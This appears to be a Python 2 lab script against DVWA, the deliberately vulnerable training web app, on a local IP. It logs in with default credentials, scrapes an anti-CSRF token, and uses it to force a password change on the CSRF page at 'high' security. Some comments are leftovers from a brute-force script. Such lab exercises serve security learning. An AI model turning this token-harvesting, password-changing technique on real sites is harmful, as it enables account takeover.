import requests
import sys
import re
from BeautifulSoup import BeautifulSoup


# Variables
target = 'http://192.168.110.138/dvwa'
sec_level = 'high'
dvwa_user = 'admin'
dvwa_pass = 'password'
dvwa_password_new = 'admin'
dvwa_password_conf = 'password'

# Value to look for in response header (Whitelisting)
success = 'Password Changed.'


# Get the anti-CSRF token
def csrf_token(path,cookie=''):
    try:
        # Make the request to the URL
        #print "\n[i] URL: %s/%s" % (target, path)
        r = requests.get("{0}/{1}".format(target, path), cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n[!] csrf_token: Failed to connect (URL: %s/%s).\n[i] Quitting." % (target, path)
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text)
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    #print "[i] user_token: %s" % user_token

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    #print "[i] session_id: %s" % session_id

    return session_id, user_token


# Login to DVWA core
def dvwa_login(session_id, user_token):
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        print "\n[i] URL: %s/login.php" % target
        print "[i] Data: %s" % data
        print "[i] Cookie: %s" % cookie
        r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target)
        sys.exit(-1)

    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print "\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code)
        sys.exit(-1)

    # Did we log in successfully?
    if r.headers["Location"] != 'index.php':
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id)
        sys.exit(-1)

    # If we got to here, everything should be okay!
    print "\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass)
    return True


# Make the request to-do the brute force
def url_request(password_new, password_conf, user_token, session_id):
    # GET data
    data = {
        "password_new": password_new,
        "password_conf": password_conf,
        "Change": "Change",
        "user_token": user_token
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        #print "\n[i] URL: %s/vulnerabilities/brute/" % target
        #print "[i] Data: %s" % data
        #print "[i] Cookie: %s" % cookie
        r = requests.get("{0}/vulnerabilities/csrf/".format(target), params=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print "\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/csrf/).\n[i] Quitting." % (target)
        sys.exit(-1)

    # Was it a ok response?
    if r.status_code != 200:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print "\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code)
        sys.exit(-1)

    # We have what we need
    return r.text


# Main brute force loop
def anti_csrf(session_id):
    
    password_new = "1234"
    password_conf = "1234"

    print "[i] Try Anti-CSRF"

    # Get CSRF token
    session_id, user_token = csrf_token('/vulnerabilities/brute/', {"PHPSESSID": session_id})

    # Make request
    url_request(password_new, password_conf, user_token, session_id)



# Get initial CSRF token
session_id, user_token = csrf_token('login.php')


# Login to web app
dvwa_login(session_id, user_token)


# Start anti_csrf
anti_csrf(session_id)